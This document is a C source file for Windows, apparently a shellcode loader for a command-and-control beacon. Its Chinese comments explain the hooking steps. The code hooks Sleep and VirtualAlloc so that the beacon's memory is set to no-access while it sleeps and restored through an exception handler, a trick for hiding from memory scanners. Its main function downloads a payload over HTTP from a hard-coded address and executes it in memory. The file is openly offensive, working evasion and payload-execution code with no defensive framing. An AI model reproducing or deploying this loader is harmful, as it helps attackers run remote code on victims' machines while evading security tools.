#include<Windows.h>
#include<stdio.h>
#include<wininet.h>
#pragma comment (lib, "wininet.lib")


LPVOID OldSleep = GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
LPVOID OldVirtualAlloc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");

CHAR OldSleepData[12] = { 0 };
CHAR OldVirtualAllocData[12] = { 0 };
DWORD Beacon_Protect = 0;
HANDLE hEvent;
LPVOID BASE_ADDRESS;
SIZE_T dwSize_Gloab;

void HookSleep();
VOID UnHookSleep();
VOID HookVirtualAlloc();
VOID UnHookVirtualAlloc();

VOID WINAPI NewSleep(DWORD64 dwMilliseconds)
{
	printf("Sleep:%d\n", dwMilliseconds);
	UnHookSleep();
	Sleep(dwMilliseconds);
	HookSleep();
	SetEvent(hEvent);
}

LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD64 flAllocationType,
	DWORD64 flProtect)
{
	UnHookVirtualAlloc();
	BASE_ADDRESS = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	dwSize_Gloab = dwSize;

	HookVirtualAlloc();
	return BASE_ADDRESS;

}

void HookSleep()
{
	DWORD OldSleepProtect = NULL;
	BYTE pSleepData[12] = { 0x48, 0xb8, 0, 0, 0 ,0, 0, 0, 0, 0, 0xff, 0xe0};
	LPVOID pNewSleep = NewSleep;
	//保存Sleep原先编码
	RtlCopyMemory(OldSleepData, OldSleep, sizeof(OldSleepData));
	//指定jmp地址
	RtlCopyMemory(&pSleepData[2], &pNewSleep, 8);
	//修改内存属性可写，保存原先内存属性到OldSleepProtect
	VirtualProtect(OldSleep, 12, PAGE_EXECUTE_READWRITE, &OldSleepProtect);
	//修改完的pSleepData覆盖掉原始的Sleep
	RtlCopyMemory(OldSleep, pSleepData, sizeof(pSleepData));
	//修改为原先的内存属性
	VirtualProtect(OldSleep, 12, OldSleepProtect, &OldSleepProtect);
}

VOID UnHookSleep()
{
	DWORD OldSleepProtect = NULL;
	VirtualProtect(OldSleep, 12, PAGE_EXECUTE_READWRITE, &OldSleepProtect);
	RtlCopyMemory(OldSleep, OldSleepData, sizeof(OldSleepData));
	VirtualProtect(OldSleep, 12, OldSleepProtect, &OldSleepProtect);
}

VOID HookVirtualAlloc()
{
	DWORD OldVirtualAllocProtect = NULL;
	BYTE pVirtualAllocData[12] = { 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0};
	LPVOID pNewVirtualAlloc = NewVirtualAlloc;

	RtlCopyMemory(OldVirtualAllocData, OldVirtualAlloc, sizeof(OldVirtualAllocData));

	RtlCopyMemory(&pVirtualAllocData[2], &pNewVirtualAlloc, 8);

	VirtualProtect(OldVirtualAlloc, 12, PAGE_EXECUTE_READWRITE, &OldVirtualAllocProtect);
	RtlCopyMemory(OldVirtualAlloc, pVirtualAllocData, sizeof(pVirtualAllocData));
	VirtualProtect(OldVirtualAlloc, 12, OldVirtualAllocProtect, &OldVirtualAllocProtect);
}

VOID UnHookVirtualAlloc()
{
	DWORD OldVirtualAllocProtect = NULL;
	VirtualProtect(OldVirtualAlloc, 12, PAGE_EXECUTE_READWRITE, &OldVirtualAllocProtect);
	RtlCopyMemory(OldVirtualAlloc, OldVirtualAllocData, sizeof(OldVirtualAllocData));
	VirtualProtect(OldVirtualAlloc, 12, OldVirtualAllocProtect, &OldVirtualAllocProtect);
}

BOOL is_Exception(DWORD64 Except_EIP)
{
	if (Except_EIP < ((DWORD64)BASE_ADDRESS + dwSize_Gloab) && Except_EIP >= (DWORD64)BASE_ADDRESS)
	{
		printf("地址符合:%x\n", Except_EIP);
		return true;
	}
	printf("地址不符合:%x\n", Except_EIP);
	return false;
}

LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS Exception)
{

	if (Exception->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(Exception->ContextRecord->Rip))
	{
		VirtualProtect(BASE_ADDRESS, dwSize_Gloab, PAGE_EXECUTE_READWRITE, &Beacon_Protect);
		return EXCEPTION_CONTINUE_EXECUTION;
	}

	return EXCEPTION_CONTINUE_SEARCH;
}


DWORD WINAPI SetProtect(LPVOID lpPatameter)
{
	while (true)
	{
		WaitForSingleObject(hEvent, INFINITE);
		VirtualProtect(BASE_ADDRESS, dwSize_Gloab, PAGE_NOACCESS, &Beacon_Protect);
		ResetEvent(hEvent);
	}
	return 0;
}

int main()
{
	
	hEvent = CreateEvent(NULL, TRUE, false, NULL);
	AddVectoredExceptionHandler(1, &VectoredExceptionHandler);
	HookVirtualAlloc();
	HookSleep();
	HANDLE Thread = CreateThread(NULL, 0, SetProtect, NULL, 0, NULL);
	CloseHandle(Thread);

	HINTERNET Session = InternetOpenA("aa", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET con = InternetConnectA(Session, "192.168.133.134", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HINTERNET Http = HttpOpenRequestA(con, "GET", "/4Iuk", "HTTP/1.1", NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, NULL);
	HttpSendRequest(Http, NULL, NULL, NULL, NULL);
	LPVOID a = VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_READWRITE);
	DWORD dwRealWord;
	BOOL response = InternetReadFile(Http, a, 0x400000, &dwRealWord);

	((void(*)())a)();
	UnHookSleep();
	UnHookVirtualAlloc();
	

}